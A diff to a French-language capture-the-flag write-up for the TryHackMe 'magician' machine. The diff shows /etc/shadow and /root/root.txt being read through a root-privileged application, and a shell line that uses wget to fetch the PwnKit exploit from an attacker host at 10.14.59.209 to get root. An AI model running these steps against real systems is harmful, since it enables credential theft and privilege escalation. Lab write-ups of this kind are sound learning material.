@@ -97,13 +97,12 @@ Je tente avec **/etc/shadow** et je le recoit aussi en base64.
 
 Cela veux dire que cette application a les droits **root**.
 
-Je regarde tape donc **/root/root.txt**
-Et je récupère bien le flag :
+Je regarde donc **/root/root.txt** pour voir et je récupère bien le flag :
 ```
 THM{magic_*******************_mad}
 ```
 # Root cheat mod !
-Rien de plus a dire :
+Pareil que pas mal de VM présente sur THM, elle est vulnérable avec PwnKit :
 ```
 magician@magician:/tmp$ wget 10.14.59.209/PwnKit
 --2023-12-05 10:06:32--  http://10.14.59.209/PwnKit
